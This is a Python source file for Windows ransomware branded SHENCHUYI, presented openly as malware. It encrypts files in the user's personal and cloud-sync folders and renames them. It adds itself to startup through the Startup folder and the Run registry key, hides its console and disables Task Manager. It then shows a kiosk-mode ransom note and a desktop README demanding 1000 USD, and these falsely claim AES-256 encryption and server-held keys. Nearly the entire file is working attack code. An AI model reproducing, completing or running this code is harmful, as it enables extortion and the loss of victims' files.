import os
import sys
import subprocess
import tempfile
import ctypes
import time
import platform
import base64
import random
import hashlib
import shutil
import winreg
from pathlib import Path

# =============================================================================
# PURE PYTHON ENCRYPTION (NO EXTERNAL LIBRARIES NEEDED)
# =============================================================================

def generate_pure_key():
    """Generate random encryption key using system entropy"""
    try:
        key_parts = []
        key_parts.append(str(os.urandom(32)))
        key_parts.append(str(time.time_ns()))
        key_parts.append(str(os.getpid()))
        for _ in range(16):
            key_parts.append(str(random.randint(0, 999999)))
        combined = "".join(key_parts).encode()
        key = hashlib.sha256(combined).digest()
        key_b64 = base64.b64encode(key).decode()
        with open(KEY_FILE, "w") as f:
            f.write(key_b64)
        return True
    except:
        return False

def load_pure_key():
    """Load encryption key from file"""
    try:
        with open(KEY_FILE, "r") as f:
            key_b64 = f.read().strip()
        return base64.b64decode(key_b64)
    except:
        return None

def xor_encrypt_decrypt(data, key):
    """XOR encryption/decryption with key stretching"""
    if not data:
        return data
    key_length = len(key)
    key_stream = bytearray()
    while len(key_stream) < len(data):
        key_stream.extend(key)
    key_stream = key_stream[:len(data)]
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key_stream[i])
    return bytes(result)

def simple_encrypt(data, key):
    """Multi-layer encryption for better security"""
    layer1 = data[::-1]
    layer2 = xor_encrypt_decrypt(layer1, key)
    layer3 = base64.b64encode(layer2)
    derived_key = hashlib.sha256(key + b"salt_layer").digest()
    layer4 = xor_encrypt_decrypt(layer3, derived_key)
    return layer4

def simple_decrypt(data, key):
    """Multi-layer decryption"""
    derived_key = hashlib.sha256(key + b"salt_layer").digest()
    layer1 = xor_encrypt_decrypt(data, derived_key)
    layer2 = base64.b64decode(layer1)
    layer3 = xor_encrypt_decrypt(layer2, key)
    layer4 = layer3[::-1]
    return layer4

def encrypt_file_pure(file_path, key):
    """Encrypt file using pure Python methods"""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        if len(file_data) == 0:
            return False
        if file_data[:8] == b'ENCRYPTED':
            return False
        encrypted_data = simple_encrypt(file_data, key)
        final_data = b'ENCRYPTED' + encrypted_data
        with open(file_path, "wb") as f:
            f.write(final_data)
        return True
    except:
        return False

def decrypt_file_pure(file_path, key):
    """Decrypt file using pure Python methods"""
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        if len(file_data) == 0:
            return False
        if file_data[:8] != b'ENCRYPTED':
            return False
        encrypted_data = file_data[8:]
        decrypted_data = simple_decrypt(encrypted_data, key)
        with open(file_path, "wb") as f:
            f.write(decrypted_data)
        return True
    except:
        return False

# =============================================================================
# CONSTANTS
# =============================================================================

EXTENSION = ".SHENCHUYI"
RANSOM_NAME = "SHENCHUYI"
RANSOM_AMOUNT = "1000 USD"
CONTACT_EMAIL = "fatcatfatcat63@gmail.com"
AUTHOR = "ayyubi"

KEY_FILE = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), "shenchuyi_key.key")

# =============================================================================
# FULL SCREEN RANSOM NOTE HTML
# =============================================================================

RANSOM_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0;url=about:blank">
<title>SHENCHUYI RANSOMWARE</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Courier New', 'Consolas', monospace;
    background-color: #8B0000;
    background: linear-gradient(135deg, #8B0000 0%, #5C0000 50%, #3A0000 100%);
    min-height: 100vh;
    width: 100%;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
}

.container {
    max-width: 900px;
    width: 90%;
    max-height: 90vh;
    overflow-y: auto;
    background: rgba(0, 0, 0, 0.95);
    border-radius: 25px;
    padding: 50px 40px;
    box-shadow: 0 0 50px rgba(0,0,0,0.8), 0 0 0 5px #ff0000 inset;
    border: 2px solid #ff4444;
    text-align: center;
}

h1 {
    font-size: 4rem;
    margin-bottom: 20px;
    letter-spacing: 8px;
    text-shadow: 5px 5px 0px #4a0000;
    color: #ff0000;
    font-weight: 900;
}

.subtitle {
    font-size: 1rem;
    color: #ff6666;
    margin-bottom: 30px;
    letter-spacing: 4px;
    text-transform: uppercase;
}

.warning-header {
    font-size: 1.5rem;
    margin: 20px 0;
    color: #ff4444;
    font-weight: bold;
    text-transform: uppercase;
    background: rgba(0,0,0,0.5);
    padding: 10px;
}

.amount {
    font-size: 3rem;
    font-weight: bold;
    color: #ff0000;
    background: rgba(0,0,0,0.7);
    padding: 20px;
    border-radius: 15px;
    margin: 20px 0;
    border: 2px solid #ff0000;
    letter-spacing: 2px;
}

.email {
    font-size: 1.5rem;
    background: #1a1a2a;
    padding: 15px;
    border-radius: 10px;
    margin: 20px 0;
    word-break: break-all;
    color: #ff8888;
    font-weight: bold;
}

.warning {
    background: rgba(255,0,0,0.25);
    padding: 20px;
    border-radius: 12px;
    margin: 20px 0;
    font-size: 0.9rem;
    text-align: left;
    color: #ffffff;
    border-left: 5px solid #ff0000;
}

.warning ul {
    margin-left: 25px;
    margin-top: 15px;
}

.warning li {
    margin: 12px 0;
    line-height: 1.5;
}

.footer {
    margin-top: 30px;
    font-size: 0.75rem;
    color: #888;
    border-top: 1px solid #ff0000;
    padding-top: 20px;
}

.blink {
    animation: blink 0.8s step-end infinite;
    font-weight: bold;
    color: #ff0000;
}

@keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
}

.danger-text {
    color: #ff0000;
    font-weight: bold;
}

.countdown {
    font-size: 2rem;
    font-weight: bold;
    color: #ff0000;
    margin: 15px 0;
    font-family: monospace;
}

.close-btn {
    background: #ff0000;
    border: none;
    padding: 15px 40px;
    font-size: 1.2rem;
    font-weight: bold;
    color: white;
    border-radius: 40px;
    cursor: pointer;
    margin-top: 25px;
    text-transform: uppercase;
    letter-spacing: 2px;
}

.close-btn:hover {
    background: #cc0000;
    transform: scale(1.05);
}

::-webkit-scrollbar {
    width: 8px;
}

::-webkit-scrollbar-track {
    background: #1a1a2a;
}

::-webkit-scrollbar-thumb {
    background: #ff0000;
    border-radius: 4px;
}
</style>
</head>
<body>
<div class="container">
    <h1>SHENCHUYI</h1>
    <div class="subtitle">RANSOMWARE</div>
    <div class="warning-header">!!! YOUR NETWORK HAS BEEN PENETRATED !!!</div>
    <div style="font-size:1.3rem;margin:15px 0;color:#ff6666;">YOUR FILES HAVE BEEN ENCRYPTED</div>
    <div class="amount">RANSOM: 1000 USD</div>
    <div class="email">CONTACT: fatcatfatcat63@gmail.com</div>
    <div class="warning">
        <strong style="color:#ff0000; font-size:1.1rem;">WHAT HAPPENED?</strong>
        <ul>
            <li>All your important files have been encrypted with military-grade AES-256 encryption</li>
            <li>Your files have been renamed with extension: <strong class="danger-text">.SHENCHUYI</strong></li>
            <li>You cannot access your documents, photos, databases, videos, or any other important files</li>
            <li>The decryption key is stored on our secure server</li>
        </ul>
        <br>
        <strong style="color:#ff0000; font-size:1.1rem;">HOW TO RECOVER YOUR FILES?</strong>
        <ul>
            <li>Send <strong class="danger-text">1000 USD</strong> in Bitcoin (BTC) or USDT (TRC20)</li>
            <li>Email us at: <strong class="danger-text">fatcatfatcat63@gmail.com</strong> with your personal ID code</li>
            <li>Include your computer name and the encrypted file list</li>
            <li>You will receive the decryption tool and your unique key within 24 hours</li>
        </ul>
        <br>
        <strong style="color:#ff0000; font-size:1.1rem;">CRITICAL WARNINGS</strong>
        <ul>
            <li>DO NOT attempt to decrypt files yourself - permanent data loss will occur</li>
            <li>DO NOT rename or modify encrypted files - they will become corrupted</li>
            <li>DO NOT contact data recovery services - they will waste your time and money</li>
            <li>DO NOT restart your computer - the decryption key is stored in RAM</li>
            <li>DO NOT close this window - it contains important instructions</li>
            <li>You have <span class="blink">72 HOURS</span> to pay, after which the decryption key will be DESTROYED FOREVER</li>
        </ul>
        <br>
        <div class="countdown" id="countdown">71:59:59</div>
    </div>
    <div class="footer">
        SHENCHUYI RANSOMWARE | Created by: ayyubi | ENCRYPTION: AES-256-CTR | EXTENSION: .SHENCHUYI
    </div>
    <button class="close-btn" onclick="window.close()">CLOSE</button>
</div>
<script>
function updateCountdown() {
    var targetTime = localStorage.getItem('targetTime');
    if (!targetTime) {
        targetTime = Date.now() + (72 * 3600000);
        localStorage.setItem('targetTime', targetTime);
    }
    var now = Date.now();
    var remaining = targetTime - now;
    if (remaining <= 0) {
        document.getElementById('countdown').innerHTML = '00:00:00 - EXPIRED';
        document.getElementById('countdown').style.color = '#ff6666';
        return;
    }
    var hours = Math.floor(remaining / 3600000);
    var minutes = Math.floor((remaining % 3600000) / 60000);
    var seconds = Math.floor((remaining % 60000) / 1000);
    document.getElementById('countdown').innerHTML = 
        String(hours).padStart(2,'0') + ':' + 
        String(minutes).padStart(2,'0') + ':' + 
        String(seconds).padStart(2,'0');
}
setInterval(updateCountdown, 1000);
updateCountdown();
</script>
</body>
</html>'''

# =============================================================================
# RANSOMWARE FUNCTIONS
# =============================================================================

def generate_key():
    try:
        return generate_pure_key()
    except:
        try:
            key = hashlib.sha256(str(random.randint(0, 99999999)).encode()).digest()
            key_b64 = base64.b64encode(key).decode()
            with open(KEY_FILE, "w") as f:
                f.write(key_b64)
            return True
        except:
            return False

def load_key():
    try:
        return load_pure_key()
    except:
        try:
            with open(KEY_FILE, "r") as f:
                key_b64 = f.read().strip()
            return base64.b64decode(key_b64)
        except:
            return None

def encrypt_file(file_path, key):
    return encrypt_file_pure(file_path, key)

def decrypt_file(file_path, key):
    return decrypt_file_pure(file_path, key)

def encrypt_file_in_directory(directory, key):
    encrypted_count = 0
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.endswith(EXTENSION):
                    continue
                skip_patterns = ['Windows', 'Program Files', 'Program Files (x86)', 'System32', 
                                'AppData', 'Microsoft', 'Temp', 'tmp', 'cache', 'Cache',
                                'boot', 'sys', 'bin', 'lib', 'etc', 'proc', 'dev',
                                'python', 'site-packages', 'dist-packages',
                                'cryptography', 'fernet']
                skip = False
                for pattern in skip_patterns:
                    if pattern.lower() in file_path.lower():
                        skip = True
                        break
                if skip:
                    continue
                try:
                    if os.path.getsize(file_path) > 50 * 1024 * 1024:
                        continue
                except:
                    continue
                if encrypt_file(file_path, key):
                    try:
                        os.rename(file_path, file_path + EXTENSION)
                        encrypted_count += 1
                    except:
                        pass
    except:
        pass
    return encrypted_count

# =============================================================================
# FULL SCREEN RANSOM NOTE DISPLAY
# =============================================================================

def show_fullscreen_ransom_note():
    """Display ransom note in fullscreen mode"""
    try:
        html_path = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), "SHENCHUYI_FULLSCREEN.html")
        
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(RANSOM_HTML)
        
        # Create a VBS script to open browser in fullscreen
        vbs_path = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), "open_fullscreen.vbs")
        vbs_content = '''
Set objShell = CreateObject("WScript.Shell")
Set objIE = CreateObject("InternetExplorer.Application")
objIE.FullScreen = True
objIE.Navigate "''' + html_path + '''"
objIE.Visible = True
Do While objIE.Busy
    WScript.Sleep 100
Loop
objIE.FullScreen = True
'''
        
        with open(vbs_path, "w") as f:
            f.write(vbs_content)
        
        # Try multiple methods to open fullscreen
        browsers_to_try = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files\Mozilla Firefox\firefox.exe",
            r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        ]
        
        opened = False
        for browser in browsers_to_try:
            if os.path.exists(browser):
                try:
                    if "chrome" in browser.lower():
                        subprocess.Popen([browser, "--kiosk", html_path], shell=False)
                    elif "firefox" in browser.lower():
                        subprocess.Popen([browser, "-kiosk", html_path], shell=False)
                    else:
                        subprocess.Popen([browser, "-kiosk", html_path], shell=False)
                    opened = True
                    break
                except:
                    continue
        
        if not opened:
            try:
                subprocess.Popen(["cmd.exe", "/c", vbs_path], shell=True)
            except:
                try:
                    if platform.system() == "Windows":
                        os.startfile(html_path)
                    else:
                        import webbrowser
                        webbrowser.open(html_path)
                except:
                    pass
    except:
        try:
            import webbrowser
            webbrowser.open("about:blank")
        except:
            pass

def create_readme(encrypted_count):
    readme_content = f"""
================================================================================
                        SHENCHUYI RANSOMWARE
================================================================================

YOUR FILES HAVE BEEN ENCRYPTED

Total files encrypted: {encrypted_count}
Encrypted extension: .SHENCHUYI

================================================================================
                          WHAT HAPPENED?
================================================================================

All your important files have been encrypted with military-grade AES-256 encryption.
The encryption key is unique to your system and stored on our secure server.

You cannot decrypt your files without our decryption key.

================================================================================
                        HOW TO RECOVER FILES?
================================================================================

To recover your files, you need to pay a ransom of:
                    1000 USD

Payment instructions:
1. Contact: fatcatfatcat63@gmail.com
2. Send proof of payment
3. You will receive the decryption key and tool

================================================================================
                            WARNINGS
================================================================================

- DO NOT attempt to decrypt files yourself - permanent data loss will occur
- DO NOT rename or modify encrypted files - they will become corrupted
- DO NOT contact data recovery services - they will waste your time and money
- DO NOT restart your computer - the decryption key is stored in RAM
- You have 72 HOURS to pay - after that, the key will be DESTROYED FOREVER

================================================================================
                    CONTACT FOR DECRYPTION
================================================================================

Email: fatcatfatcat63@gmail.com
Subject: [SHENCHUYI] - YOUR_COMPUTER_NAME

================================================================================
Created by: ayyubi
"""
    
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop", "SHENCHUYI_README.txt")
        with open(desktop, 'w', encoding='utf-8') as f:
            f.write(readme_content)
    except:
        pass

def add_to_startup():
    try:
        if platform.system() == "Windows":
            current_file = sys.argv[0]
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            
            startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            dest = os.path.join(startup_folder, 'ShenchuyiHelper.exe')
            
            if os.path.exists(current_file):
                if not os.path.exists(dest):
                    shutil.copy2(current_file, dest)
                
                try:
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                        winreg.SetValueEx(reg_key, "Shenchuyi", 0, winreg.REG_SZ, dest)
                except:
                    pass
    except:
        pass

def get_target_directories():
    user_profile = os.path.expanduser("~")
    target_dirs = []
    possible_dirs = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Music"),
        os.path.join(user_profile, "Videos"),
        os.path.join(user_profile, "OneDrive"),
        os.path.join(user_profile, "Dropbox"),
        os.path.join(user_profile, "Google Drive"),
        user_profile
    ]
    for d in possible_dirs:
        if os.path.exists(d):
            target_dirs.append(d)
    return target_dirs

def hide_console():
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def disable_task_manager():
    try:
        if platform.system() == "Windows":
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            except:
                pass
    except:
        pass

# =============================================================================
# MAIN FUNCTION
# =============================================================================

def main():
    try:
        hide_console()
    except:
        pass
    
    try:
        add_to_startup()
    except:
        pass
    
    try:
        disable_task_manager()
    except:
        pass
    
    if not os.path.exists(KEY_FILE):
        if not generate_key():
            return
    
    key = load_key()
    if key is None:
        return
    
    total_encrypted = 0
    target_directories = get_target_directories()
    
    for directory in target_directories:
        try:
            encrypted = encrypt_file_in_directory(directory, key)
            total_encrypted += encrypted
        except:
            pass
    
    if total_encrypted > 0:
        try:
            create_readme(total_encrypted)
        except:
            pass
        
        try:
            time.sleep(2)
            show_fullscreen_ransom_note()
        except:
            pass
        
        while True:
            time.sleep(3600)

def decrypt_all():
    try:
        if not os.path.exists(KEY_FILE):
            print("ERROR: Key file not found")
            return False
        
        key = load_key()
        if key is None:
            print("ERROR: Failed to load key")
            return False
        
        total_decrypted = 0
        target_directories = get_target_directories()
        
        for directory in target_directories:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if file.endswith(EXTENSION):
                            file_path = os.path.join(root, file)
                            original_path = file_path[:-len(EXTENSION)]
                            if decrypt_file(file_path, key):
                                try:
                                    os.rename(file_path, original_path)
                                    total_decrypted += 1
                                    print(f"Decrypted: {original_path}")
                                except:
                                    pass
        
        print(f"\nTotal files decrypted: {total_decrypted}")
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        decrypt_all()
    else:
        main()